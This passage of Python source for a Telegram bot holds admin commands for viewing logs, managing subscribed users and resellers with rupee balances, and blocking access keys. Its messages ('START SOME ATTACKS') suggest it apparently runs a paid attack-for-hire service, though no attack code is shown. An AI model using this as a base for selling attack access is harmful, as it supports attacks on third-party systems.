        if message.chat.type != "private":
            message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message_text)
            return
        user_id = str(message.from_user.id)
        if user_id not in admin_id:
            message = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *ADMIN ONLY COMMAND* 🔒\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        if not os.path.exists(LOG_FILE):
            message = f"[\\\-=x\\\-=] *LOG STATUS* [\\\-=x\\\-=]\n[*] *NO LOGS FOUND\\, BHAI\\!* 📜🚫\n[\\\-=x\\\-=] *START SOME ATTACKS\\!* [\\\-=x\\\-=] 💾😎"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        with open(LOG_FILE, "r") as file:
            logs = file.readlines()[-10:]  # Last 10 lines
        log_text = "".join(logs)
        message = f"[\\\-=x\\\-=] *RECENT LOGS* [\\\-=x\\\-=]\n[*] *LATEST ACTIVITY\\, BHAI\\!* 📜✨\n\n```{escape_markdown_v2(log_text)}```\n[\\\-=x\\\-=] *KEEP MONITORING\\!* [\\\-=x\\\-=] 💾😎"
        send_message_safe(message.chat.id, message, create_main_menu())
    except Exception as e:
        log_error(f"Logs command error: {str(e)}")
        send_message_safe(message.chat.id, f"[\\\-=x\\\-=] *ERROR* [\\\-=x\\\-=]\n>>> *SOMETHING WENT WRONG* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓", create_main_menu())

@bot.message_handler(commands=['users'])
def list_users(message):
    """Handle /users command to list authorized users."""
    try:
        log_error(f"Received /users command from user {message.from_user.id}")
        if message.chat.type != "private":
            message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message_text)
            return
        user_id = str(message.from_user.id)
        if user_id not in admin_id:
            message = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *ADMIN ONLY COMMAND* 🔒\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        user_list = []
        for uid, expiration in users.items():
            try:
                expiration_date = datetime.datetime.strptime(expiration, '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                status = "ACTIVE" if datetime.datetime.now(IST) < expiration_date else "EXPIRED"
                user_info = bot.get_chat(uid)
                username = user_info.username if user_info.username else f"UserID_{uid}"
                user_list.append(f">>> *USER*: @{escape_markdown_v2(username)} 💻\n>>> *ID*: `{escape_markdown_v2(uid)}` 🆔\n>>> *EXPIRATION*: `{escape_markdown_v2(expiration)}` ⏳\n>>> *STATUS*: `{escape_markdown_v2(status)}` 🟢\n")
            except ValueError:
                user_list.append(f">>> *ID*: `{escape_markdown_v2(uid)}` 🆔\n>>> *EXPIRATION*: ERROR 🚨\n")
        for uid, expiration in authorized_users.items():
            try:
                expiration_date = datetime.datetime.strptime(expiration, '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                status = "ACTIVE" if datetime.datetime.now(IST) < expiration_date else "EXPIRED"
                user_info = bot.get_chat(uid)
                username = user_info.username if user_info.username else f"UserID_{uid}"
                user_list.append(f">>> *AUTH USER*: @{escape_markdown_v2(username)} 💻\n>>> *ID*: `{escape_markdown_v2(uid)}` 🆔\n>>> *EXPIRATION*: `{escape_markdown_v2(expiration)}` ⏳\n>>> *STATUS*: `{escape_markdown_v2(status)}` 🟢\n")
            except ValueError:
                user_list.append(f">>> *AUTH ID*: `{escape_markdown_v2(uid)}` 🆔\n>>> *EXPIRATION*: ERROR 🚨\n")
        if not user_list:
            message = f"[\\\-=x\\\-=] *USER DATABASE* [\\\-=x\\\-=]\n[*] *NO USERS FOUND\\, BHAI\\!* 👥🚫\n[\\\-=x\\\-=] *ADD SOME USERS\\!* [\\\-=x\\\-=] 💾😎"
        else:
            message = f"[\\\-=x\\\-=] *USER DATABASE* [\\\-=x\\\-=]\n[*] *ALL USERS LISTED\\, BHAI\\!* 👥✨\n\n{''.join(user_list)}[\\\-=x\\\-=] *KEEP MANAGING\\!* [\\\-=x\\\-=] 💾😎"
        send_message_safe(message.chat.id, message, create_main_menu())
    except Exception as e:
        log_error(f"Users command error: {str(e)}")
        send_message_safe(message.chat.id, f"[\\\-=x\\\-=] *ERROR* [\\\-=x\\\-=]\n>>> *SOMETHING WENT WRONG* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓", create_main_menu())

@bot.message_handler(commands=['add'])
def add_user(message):
    """Handle /add command to add a user."""
    try:
        log_error(f"Received /add command from user {message.from_user.id}")
        if message.chat.type != "private":
            message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message_text)
            return
        user_id = str(message.from_user.id)
        if user_id not in admin_id:
            message = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *ADMIN ONLY COMMAND* 🔒\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        command = message.text.split()
        if len(command) != 2:
            message = f"[\\\-=x\\\-=] *INVALID SYNTAX DETECTED* [\\\-=x\\\-=]\n>>> *USAGE*: `/add <user_id>` ➕\n>>> *EXAMPLE*: `/add 123456789`\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        new_user_id = command[1]
        expiration_time = add_time_to_current_date(months=1)  # Default 1 month
        authorized_users[new_user_id] = expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')
        save_authorized_users()
        message = f"[\\\-=x\\\-=] *USER ADDED* [\\\-=x\\\-=]\n[*] *NEW USER AUTHORIZED\\, BHAI\\!* ✅👥\n>>> *USER ID*: `{escape_markdown_v2(new_user_id)}` 🆔\n>>> *EXPIRES ON*: `{escape_markdown_v2(expiration_time.strftime('%Y-%m-%d %I:%M:%S %p'))}` ⏳\n[\\\-=x\\\-=] *SYSTEM UPDATED\\!* [\\\-=x\\\-=] 💾😎"
        send_message_safe(message.chat.id, message, create_main_menu())
    except Exception as e:
        log_error(f"Add user command error: {str(e)}")
        send_message_safe(message.chat.id, f"[\\\-=x\\\-=] *ERROR* [\\\-=x\\\-=]\n>>> *SOMETHING WENT WRONG* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓", create_main_menu())

@bot.message_handler(commands=['remove'])
def remove_user(message):
    """Handle /remove command to remove a user."""
    try:
        log_error(f"Received /remove command from user {message.from_user.id}")
        if message.chat.type != "private":
            message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message_text)
            return
        user_id = str(message.from_user.id)
        if user_id not in admin_id:
            message = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *ADMIN ONLY COMMAND* 🔒\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        command = message.text.split()
        if len(command) != 2:
            message = f"[\\\-=x\\\-=] *INVALID SYNTAX DETECTED* [\\\-=x\\\-=]\n>>> *USAGE*: `/remove <user_id>` ➖\n>>> *EXAMPLE*: `/remove 123456789`\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        remove_user_id = command[1]
        removed = False
        if remove_user_id in users:
            del users[remove_user_id]
            save_users()
            removed = True
        if remove_user_id in authorized_users:
            del authorized_users[remove_user_id]
            save_authorized_users()
            removed = True
        if removed:
            message = f"[\\\-=x\\\-=] *USER REMOVED* [\\\-=x\\\-=]\n[*] *USER DEAUTHORIZED\\, BHAI\\!* ✅➖\n>>> *USER ID*: `{escape_markdown_v2(remove_user_id)}` 🆔\n[\\\-=x\\\-=] *SYSTEM UPDATED\\!* [\\\-=x\\\-=] 💾😎"
        else:
            message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *USER ID {escape_markdown_v2(remove_user_id)} NOT FOUND* 🚫\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
        send_message_safe(message.chat.id, message, create_main_menu())
    except Exception as e:
        log_error(f"Remove user command error: {str(e)}")
        send_message_safe(message.chat.id, f"[\\\-=x\\\-=] *ERROR* [\\\-=x\\\-=]\n>>> *SOMETHING WENT WRONG* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓", create_main_menu())

@bot.message_handler(commands=['resellers'])
def list_resellers(message):
    """Handle /resellers command to list resellers."""
    try:
        log_error(f"Received /resellers command from user {message.from_user.id}")
        if message.chat.type != "private":
            message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message_text)
            return
        user_id = str(message.from_user.id)
        if user_id not in admin_id:
            message = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *ADMIN ONLY COMMAND* 🔒\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        if not resellers:
            message = f"[\\\-=x\\\-=] *RESELLER DATABASE* [\\\-=x\\\-=]\n[*] *NO RESELLERS FOUND\\, BHAI\\!* 💸🚫\n[\\\-=x\\\-=] *ADD SOME RESELLERS\\!* [\\\-=x\\\-=] 💾😎"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        reseller_list = []
        for reseller_id, balance in resellers.items():
            user_info = bot.get_chat(reseller_id)
            username = user_info.username if user_info.username else f"UserID_{reseller_id}"
            reseller_list.append(f">>> *RESELLER*: @{escape_markdown_v2(username)} 💻\n>>> *ID*: `{escape_markdown_v2(reseller_id)}` 🆔\n>>> *BALANCE*: `{escape_markdown_v2(balance)}` Rs 🤑\n")
        message = f"[\\\-=x\\\-=] *RESELLER DATABASE* [\\\-=x\\\-=]\n[*] *ALL RESELLERS LISTED\\, BHAI\\!* 💸✨\n\n{''.join(reseller_list)}[\\\-=x\\\-=] *KEEP MANAGING\\!* [\\\-=x\\\-=] 💾😎"
        send_message_safe(message.chat.id, message, create_main_menu())
    except Exception as e:
        log_error(f"Resellers command error: {str(e)}")
        send_message_safe(message.chat.id, f"[\\\-=x\\\-=] *ERROR* [\\\-=x\\\-=]\n>>> *SOMETHING WENT WRONG* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓", create_main_menu())

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    """Handle /addbalance command to add balance to a reseller."""
    try:
        log_error(f"Received /addbalance command from user {message.from_user.id}")
        if message.chat.type != "private":
            message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message_text)
            return
        user_id = str(message.from_user.id)
        if user_id not in admin_id:
            message = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *ADMIN ONLY COMMAND* 🔒\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        command = message.text.split()
        if len(command) != 3:
            message = f"[\\\-=x\\\-=] *INVALID SYNTAX DETECTED* [\\\-=x\\\-=]\n>>> *USAGE*: `/addbalance <reseller_id> <amount>` 💰\n>>> *EXAMPLE*: `/addbalance 123456789 500`\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        reseller_id = command[1]
        try:
            amount = int(command[2])
        except ValueError:
            message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *INVALID AMOUNT* 🚨\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        if reseller_id in resellers:
            resellers[reseller_id] += amount
            save_resellers(resellers)
            message = f"[\\\-=x\\\-=] *BALANCE UPDATED* [\\\-=x\\\-=]\n[*] *RESELLER BALANCE ADDED\\, BHAI\\!* ✅💰\n>>> *RESELLER ID*: `{escape_markdown_v2(reseller_id)}` 🆔\n>>> *ADDED*: `{escape_markdown_v2(amount)}` Rs 🤑\n>>> *NEW BALANCE*: `{escape_markdown_v2(resellers[reseller_id])}` Rs\n[\\\-=x\\\-=] *SYSTEM UPDATED\\!* [\\\-=x\\\-=] 💾😎"
            send_message_safe(message.chat.id, message, create_main_menu())
        else:
            message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *RESELLER {escape_markdown_v2(reseller_id)} NOT FOUND* 🚫\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
    except Exception as e:
        log_error(f"Addbalance command error: {str(e)}")
        send_message_safe(message.chat.id, f"[\\\-=x\\\-=] *ERROR* [\\\-=x\\\-=]\n>>> *SOMETHING WENT WRONG* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓", create_main_menu())

@bot.message_handler(commands=['removereseller'])
def remove_reseller(message):
    """Handle /removereseller command to remove a reseller."""
    try:
        log_error(f"Received /removereseller command from user {message.from_user.id}")
        if message.chat.type != "private":
            message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message_text)
            return
        user_id = str(message.from_user.id)
        if user_id not in admin_id:
            message = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *ADMIN ONLY COMMAND* 🔒\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        command = message.text.split()
        if len(command) != 2:
            message = f"[\\\-=x\\\-=] *INVALID SYNTAX DETECTED* [\\\-=x\\\-=]\n>>> *USAGE*: `/removereseller <reseller_id>` 🚫\n>>> *EXAMPLE*: `/removereseller 123456789`\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        reseller_id = command[1]
        if reseller_id in resellers:
            del resellers[reseller_id]
            save_resellers(resellers)
            message = f"[\\\-=x\\\-=] *RESELLER REMOVED* [\\\-=x\\\-=]\n[*] *RESELLER DEACTIVATED\\, BHAI\\!* ✅🚫\n>>> *RESELLER ID*: `{escape_markdown_v2(reseller_id)}` 🆔\n[\\\-=x\\\-=] *SYSTEM UPDATED\\!* [\\\-=x\\\-=] 💾😎"
            send_message_safe(message.chat.id, message, create_main_menu())
        else:
            message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *RESELLER {escape_markdown_v2(reseller_id)} NOT FOUND* 🚫\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
    except Exception as e:
        log_error(f"Removereseller command error: {str(e)}")
        send_message_safe(message.chat.id, f"[\\\-=x\\\-=] *ERROR* [\\\-=x\\\-=]\n>>> *SOMETHING WENT WRONG* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓", create_main_menu())

@bot.message_handler(commands=['block'])
def block_key(message):
    """Handle /block command to block a key."""
    try:
        log_error(f"Received /block command from user {message.from_user.id}")
        if message.chat.type != "private":
            message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message_text)
            return
        user_id = str(message.from_user.id)
        if user_id not in admin_id:
            message = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *ADMIN ONLY COMMAND* 🔒\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        command = message.text.split()
        if len(command) != 2:
            message = f"[\\\-=x\\\-=] *INVALID SYNTAX DETECTED* [\\\-=x\\\-=]\n>>> *USAGE*: `/block <key_name>` 🔒\n>>> *EXAMPLE*: `/block Rahul_sadiq-rahul`\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        key = command[1]
        if key in keys:
            keys[key]["blocked"] = True
            save_keys()
            message = f"[\\\-=x\\\-=] *KEY BLOCKED* [\\\-=x\\\-=]\n[*] *KEY DEACTIVATED\\, BHAI\\!* ✅🔒\n>>> *KEY*: `{escape_markdown_v2(key)}` 🆔\n[\\\-=x\\\-=] *SYSTEM UPDATED\\!* [\\\-=x\\\-=] 💾😎"
            send_message_safe(message.chat.id, message, create_main_menu())
        else:
            message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *KEY {escape_markdown_v2(key)} NOT FOUND* 🚫\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
    except Exception as e:
        log_error(f"Block key command error: {str(e)}")
        send_message_safe(message.chat.id, f"[\\\-=x\\\-=] *ERROR* [\\\-=x\\\-=]\n>>> *SOMETHING WENT WRONG* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓", create_main_menu())

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Handle all messages to catch unhandled commands."""
    try:
        log_error(f"Received unhandled message: {message.text} from user {message.from_user.id}")
        message_text = f"[\\\-=x\\\-=] *UNKNOWN COMMAND* [\\\-=x\\\-=]\n>>> *COMMAND NOT RECOGNIZED* 🚫\n>>> *USE `/help` TO SEE ALL COMMANDS\\, BHAI\\!* 📋\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
        send_message_safe(message.chat.id, message_text, create_main_menu())
    except Exception as e:
        log_error(f"Unhandled message error: {str(e)}")
        send_message_safe(message.chat.id, f"[\\\-=x\\\-=] *ERROR* [\\\-=x\\\-=]\n>>> *SOMETHING WENT WRONG* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓", create_main_menu())

def run_bot_with_retry():
    """Run the bot with exponential backoff retry on failure."""
    retry_count = 0
    max_retries = 5
    base_delay = 5  # seconds
    while retry_count < max_retries:
        try:
            log_error("Starting bot polling...")
            bot.infinity_polling(none_stop=True, interval=0)
        except Exception as e:
            retry_count += 1
            delay = base_delay * (2 ** retry_count)
            log_error(f"Bot polling failed: {str(e)}. Retrying in {delay} seconds (Attempt {retry_count}/{max_retries})")
            time.sleep(delay)
    log_error("Max retries reached. Bot stopped.")

if __name__ == "__main__":
    try:
        if not check_environment():
            log_error("Environment check failed. Exiting.")
            exit(1)
        if not validate_bot_token():
            log_error("Bot token invalid. Exiting.")
            exit(1)
        clear_webhook()
        load_data()
        log_error("Bot started successfully.")
        run_bot_with_retry()
    except Exception as e:
        log_error(f"Fatal error in main: {str(e)}")
        exit(1)